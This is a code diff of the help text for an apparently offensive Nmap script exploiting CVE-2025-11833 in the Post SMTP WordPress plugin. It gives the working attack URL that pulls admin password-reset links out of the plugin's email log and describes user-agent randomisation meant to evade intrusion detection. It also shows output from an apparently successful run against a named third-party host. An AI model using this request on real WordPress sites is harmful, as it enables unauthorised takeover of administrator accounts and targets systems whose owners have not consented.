@@ -317,7 +317,7 @@ PORT      STATE    SERVICE
 
 $install11833 = @"
 
-Author: r00t-3xp10it - V1.5
+CVE-2025-11833:
 The Post SMTP – Complete SMTP Solution with Logs, Alerts, Backup SMTP & Mobile App plugin
 for WordPress is vulnerable to unauthorized access of data due to a missing capability check
 on the __construct function in all versions up to and including, 3.6.0 This makes it possible
@@ -327,6 +327,7 @@ including password reset emails containing password reset links which can lead t
 Remark: --script-args exploit="true" argument sends an http.post() request with a link to reset
 the wordpress admin password, then checks if target host responds with the recuperation link to
 confirm that system its 100% vulnerable to CVE-2025-11833 wordpress reset link vulnerability.
+Note: this script tests a pre-defined list of wp-login.php possible locations {uris_to_test}
 Note: this script random sellects an user-agent to send in the http.post(IDS signature evasion)
 
 Output
@@ -337,7 +338,6 @@ NSE: testing login: [404] http://183.181.84.11:80/wp-admin.php
 NSE: testing login: [404] http://183.181.84.11:80/login-page.php
 NSE: testing login: [404] http://183.181.84.11:80/secure-login.php
 NSE: testing login: [200] http://183.181.84.11:80/wp-login.php [ found ]
-NSE: attack vector: /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id=1&print=1
 Nmap scan report for sv8490.xserver.jp (183.181.84.11)
 Host is up (0.28s latency)
 
@@ -354,9 +354,10 @@ CVE-2025-11833:
 |  Disclosure date: 2025-11-01
 |  Exploit results:
 |   smtp detection: post smtp 3.6.0 [vulnerable version]
-|   _post request: /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id=1&print=1
-|   _response: PASSWORD RESET LINK FOUND IN RESPONSE [vulnerable]
-|     module author: r00t-3xp10it
+|    _login-search: 7 of 36 wp-login.php possible urls tested
+|    _post-request: /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id=1&print=1
+|    _response: PASSWORD RESET LINK FOUND IN RESPONSE [vulnerable]
+|      module author: r00t-3xp10it
 |
 | Referencies:
 |   https://www.sentinelone.com/vulnerability-database/cve-2025-11833
